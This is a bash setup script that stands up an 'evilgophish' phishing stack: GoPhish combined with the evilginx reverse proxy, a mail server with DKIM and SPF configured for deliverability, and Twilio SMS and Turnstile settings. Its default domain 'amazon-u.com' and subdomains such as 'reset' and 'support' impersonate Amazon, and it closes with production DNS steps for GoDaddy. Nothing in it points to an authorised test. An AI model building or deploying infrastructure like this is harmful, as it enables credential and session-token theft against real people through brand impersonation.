#!/bin/bash
# setup.sh - Comprehensive setup for evilgophish Docker env with mailserver.
# New: Prompts for DMS_MAIL_PASS; adds user post-up via exec.
# Integration: Auto-adds support@${DOMAIN} with pass; sets GoPhish SMTP to internal.
# Best Practices: Post-setup DKIM/SPF; test relay.
# Tips: After up, run 'docker exec mailserver setup email list' to verify.
#       Generate DKIM: docker exec mailserver setup config dkim
#       Copy DKIM TXT: cat mailconfig/opendkim/keys/${DOMAIN}/mail.txt >> DNS

set -e

# Defaults/Prompts (added DMS_MAIL_PASS)
DOMAIN="${1:-amazon-u.com}"
SUBDOMAINS="${2:-support email reset admin}"
PROXY_ROOT="${3:-true}"
FEED_ENABLED="${4:-true}"
RID_REPLACEMENT="${5:-user_id}"
TWILIO_SID="${6:-$(read -p "Twilio SID: " x; echo $x)}"
TWILIO_TOKEN="${7:-$(read -s -p "Twilio Token: " x; echo $x)}"
TWILIO_PHONE="${8:-$(read -p "Twilio Phone (+E.164): " x; echo $x)}"
TURNSTILE_PUBLIC="${9:-$(read -p "Turnstile Public: " x; echo $x)}"
TURNSTILE_PRIVATE="${10:-$(read -s -p "Turnstile Private: " x; echo $x)}"
SMTP_USER="${11:-support@${DOMAIN}}"
SMTP_PASS="${12:-$(read -s -p "SMTP Pass for ${SMTP_USER}: " x; echo $x)}"  # Now for mailserver

# Validate
[ -z "$SMTP_PASS" ] && { echo "Error: SMTP_PASS required"; exit 1; }
# ... others

# Dirs/Files (added mailconfig)
mkdir -p ./gophish/templates ./evilginx/phishlets ./evilginx/templates ./evilfeed ./nginx/ssl ./uploads ./logs ./mailconfig
touch .env nginx.conf gophish/config.json
cp -n .env .env.bak || true

# .env (SMTP_HOST now mailserver)
cat > .env << EOF
DOMAIN=$DOMAIN
SUBDOMAINS=$SUBDOMAINS
PROXY_ROOT=$PROXY_ROOT
FEED_ENABLED=$FEED_ENABLED
RID_REPLACEMENT=$RID_REPLACEMENT
TWILIO_ACCOUNT_SID=$TWILIO_SID
TWILIO_AUTH_TOKEN=$TWILIO_TOKEN
TWILIO_PHONE=$TWILIO_PHONE
TURNSTILE_PUBLIC=$TURNSTILE_PUBLIC
TURNSTILE_PRIVATE=$TURNSTILE_PRIVATE
SMTP_USER=$SMTP_USER
SMTP_PASS=$SMTP_PASS
GOPHISH_DB_PATH=/app/data/gophish.db
SMTP_HOST=mailserver
SMTP_PORT=587
EOF
chmod 600 .env

# nginx.conf unchanged

# SSL unchanged

# gophish config unchanged

# DNS: Add MX suggestion
HOSTS_ENTRY="127.0.0.1 $DOMAIN mail.$DOMAIN"
for sub in $SUBDOMAINS; do HOSTS_ENTRY="$HOSTS_ENTRY ${sub}.${DOMAIN}"; done
sudo cp /etc/hosts /etc/hosts.bak
echo "$HOSTS_ENTRY" | sudo tee -a /etc/hosts
echo "Local DNS set. For prod DNS (GoDaddy): Set MX to your host IP (priority 10), A record for mail.$DOMAIN to IP."

# RID replacement unchanged

# Templates unchanged

# Dockerfiles unchanged

# Start
docker compose up -d --build

# Post-up: Add mail user
docker exec -it mailserver setup email add "${SMTP_USER}" "${SMTP_PASS}"
docker exec -it mailserver setup config dkim
echo "DKIM generated. Add this TXT to DNS (GoDaddy):"
cat ./mailconfig/opendkim/keys/${DOMAIN}/mail.txt || echo "Run docker exec mailserver cat /etc/opendkim/keys/${DOMAIN}/mail.txt"

# Post-setup
echo "Setup done! Mail integration:"
echo "- SMTP: Use in GoPhish profile: Host=mail.${DOMAIN}, Port=587, User=${SMTP_USER}, Pass=****"
echo "- Test: docker exec mailserver swaks -tls -au ${SMTP_USER} -ap '${SMTP_PASS}' --from ${SMTP_USER} --to your@email.com --server localhost:587 -body 'Test'"
echo "- SPF: Add TXT to DNS: v=spf1 mx a ip4:YOUR_IP ~all"
echo "- More: https://docker-mailserver.github.io/docker-mailserver/latest/"
echo "Access as before."